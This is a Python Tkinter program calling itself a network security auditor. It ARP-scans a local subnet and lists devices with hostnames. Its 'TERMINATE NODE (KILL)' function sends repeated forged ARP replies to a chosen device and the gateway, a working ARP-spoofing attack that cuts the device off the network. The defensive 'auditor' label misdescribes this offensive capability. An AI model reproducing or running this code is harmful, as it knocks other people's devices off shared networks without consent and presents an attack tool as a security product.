import tkinter as tk
from tkinter import ttk, messagebox
import scapy.all as scapy
import threading
import socket
import time

class SentinelFinal:
    def __init__(self, root):
        self.root = root
        self.root.title("Sentinel AI - Professional Network Security Auditor")
        self.root.geometry("1000x600")
        self.root.configure(bg="#0a0a0a")

        # Header
        tk.Label(root, text="SENTINEL AI - NETWORK MONITOR", font=("Courier", 24, "bold"), bg="#0a0a0a", fg="#00ff00").pack(pady=20)

        # Input Frame
        input_frame = tk.Frame(root, bg="#0a0a0a")
        input_frame.pack(pady=5)
        
        tk.Label(input_frame, text="Network Range:", font=("Arial", 12), bg="#0a0a0a", fg="white").pack(side=tk.LEFT)
        self.ip_entry = tk.Entry(input_frame, font=("Arial", 12), width=22, bg="#1a1a1a", fg="white", insertbackground="white")
        self.ip_entry.insert(0, "192.168.100.0/24")
        self.ip_entry.pack(side=tk.LEFT, padx=10)

        # Updated Style for Table (Fix for your error)
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#1a1a1a", foreground="white", fieldbackground="#1a1a1a", rowheight=35, font=("Arial", 10))
        # Headings fix
        style.configure("Treeview.Heading", background="#333333", foreground="white", font=("Arial", 11, "bold"))
        style.map("Treeview", background=[('selected', '#00ff00')], foreground=[('selected', 'black')])

        # Device Table Columns
        self.tree = ttk.Treeview(root, columns=("IP", "MAC", "Device Hostname", "Security Status"), show="headings")
        self.tree.heading("IP", text="IP ADDRESS")
        self.tree.heading("MAC", text="MAC ADDRESS")
        self.tree.heading("Device Hostname", text="DEVICE HOSTNAME")
        self.tree.heading("Security Status", text="SECURITY STATUS")
        
        for col in ("IP", "MAC", "Device Hostname", "Security Status"):
            self.tree.column(col, width=220, anchor="center")
            
        self.tree.pack(pady=20, padx=20, fill="both", expand=True)

        # Control Panel Buttons
        ctrl_frame = tk.Frame(root, bg="#0a0a0a")
        ctrl_frame.pack(pady=10)

        tk.Button(ctrl_frame, text="DEEP SCAN NETWORK", font=("Arial", 11, "bold"), bg="#00ff00", width=25, height=2, command=self.start_scan).pack(side=tk.LEFT, padx=15)
        tk.Button(ctrl_frame, text="TERMINATE NODE (KILL)", font=("Arial", 11, "bold"), bg="#ff0000", fg="white", width=25, height=2, command=self.start_kill).pack(side=tk.LEFT, padx=15)

        self.status = tk.Label(root, text="System Ready | Waiting for User Command", bg="#0a0a0a", fg="#00ff00", font=("Arial", 10))
        self.status.pack(side=tk.BOTTOM, fill="x", pady=5)

        self.killing = False

    def get_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return "Encrypted/Mobile Node"

    def scan_logic(self):
        self.status.config(text="Scanning... Broadcasting ARP Packets", fg="yellow")
        target_ip = self.ip_entry.get()
        
        try:
            arp_req = scapy.ARP(pdst=target_ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_req
            answered = scapy.srp(packet, timeout=3, retry=2, verbose=False)[0]

            for item in self.tree.get_children(): self.tree.delete(item)

            for snd, rcv in answered:
                ip = rcv.psrc
                mac = rcv.hwsrc
                name = self.get_hostname(ip)
                
                if ip.endswith(".1"):
                    sec_status = "GATEWAY (TRUSTED)"
                elif "Hamad" in name or ip == "192.168.100.28": # Update if your PC IP changes
                    sec_status = "ADMINISTRATOR (LOCAL)"
                else:
                    sec_status = "SECURE NODE"
                    
                self.tree.insert("", tk.END, values=(ip, mac, name, sec_status))
            
            self.status.config(text=f"Scan Complete: {len(answered)} Nodes Found", fg="#00ff00")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {e}")

    def kill_logic(self, target_ip, target_mac):
        gateway_ip = target_ip.rsplit('.', 1)[0] + '.1'
        self.killing = True
        self.status.config(text=f"TERMINATING: Isolating {target_ip}...", fg="red")
        try:
            for _ in range(60): 
                if not self.killing: break
                p1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                p2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
                scapy.send(p1, verbose=False)
                scapy.send(p2, verbose=False)
                time.sleep(0.5)
        except: pass
        self.status.config(text="System Ready", fg="#00ff00")
        self.killing = False

    def start_scan(self): threading.Thread(target=self.scan_logic, daemon=True).start()
    
    def start_kill(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select a device first!")
            return
        ip, mac, _, status = self.tree.item(selected)['values']
        if "GATEWAY" in status:
            messagebox.showerror("Error", "Cannot kill the Gateway!")
            return
        threading.Thread(target=self.kill_logic, args=(ip, mac), daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = SentinelFinal(root)
    root.mainloop()